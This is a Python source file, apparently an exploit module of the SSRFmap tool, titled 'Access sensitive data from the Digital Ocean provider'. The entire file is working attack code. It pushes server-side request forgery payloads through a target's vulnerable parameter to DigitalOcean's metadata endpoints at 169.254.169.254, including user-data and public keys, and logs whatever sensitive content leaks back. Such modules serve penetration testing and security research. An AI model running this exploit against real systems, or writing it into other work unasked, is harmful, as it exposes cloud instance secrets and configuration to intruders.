import logging
import os
from typing import List, Set, Tuple

from ssrfmap.core.utils import diff_text, wrapper_http

name = "digitalocean"
description = "Access sensitive data from the Digital Ocean provider"
author = "Swissky"
documentation: List[str] = [
    "https://developers.digitalocean.com/documentation/metadata/"
]


class exploit:
    endpoints: Set[Tuple[str, str]] = set()

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0], "80")
                r = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info("\033[32mReading file\033[0m : {}".format(payload))
                    logging.debug(diff)

    def add_endpoints(self):
        self.endpoints.add(("169.254.169.254", "metadata/v1/id"))
        self.endpoints.add(("169.254.169.254", "metadata/v1/user-data"))
        self.endpoints.add(("169.254.169.254", "metadata/v1/hostname"))
        self.endpoints.add(("169.254.169.254", "metadata/v1/region"))
        self.endpoints.add(("169.254.169.254", "metadata/v1/public-keys"))
        self.endpoints.add(("169.254.169.254", "metadata/v1.json"))
